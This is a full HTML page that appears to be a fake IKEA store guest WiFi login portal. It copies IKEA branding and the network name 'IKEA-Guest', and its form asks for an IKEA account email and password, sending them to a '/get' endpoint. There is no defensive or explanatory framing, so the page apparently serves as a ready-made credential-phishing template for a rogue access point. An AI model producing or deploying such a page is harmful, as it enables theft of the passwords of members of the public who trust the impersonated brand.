<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0058A3;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.iklogo{text-align:center;margin-bottom:20px}
.iklogo .box{display:inline-block;background:#FFDA1A;padding:8px 20px;border-radius:4px;margin-bottom:8px}
.iklogo .box span{font-size:28px;font-weight:900;color:#0058A3;letter-spacing:2px}
.iklogo p{font-size:11px;color:rgba(255,255,255,0.7);letter-spacing:1.5px;text-transform:uppercase}
.card{background:#fff;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.25)}
.ch{background:#FFDA1A;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#0058A3}.ch p{font-size:12px;color:#555;margin-top:3px}
.cb{padding:24px}
.badge{display:flex;align-items:center;gap:10px;background:#f0f6ff;border:1px solid #c0d8f0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#0058A3;box-shadow:0 0 0 3px rgba(0,88,163,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#0058A3}
.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#0058A3;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="iklogo"><div class="box"><span>IKEA</span></div><p>The wonderful everyday &bull; Free WiFi</p></div>
<div class="card">
  <div class="ch"><h1>IKEA Store WiFi</h1><p>Sign in with your IKEA account</p></div>
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>IKEA-Guest</strong></span></div>
    <form action="/get">
      <label class="lbl">IKEA Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">IKEA's Terms of Use</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
</div>
</body>
</html>
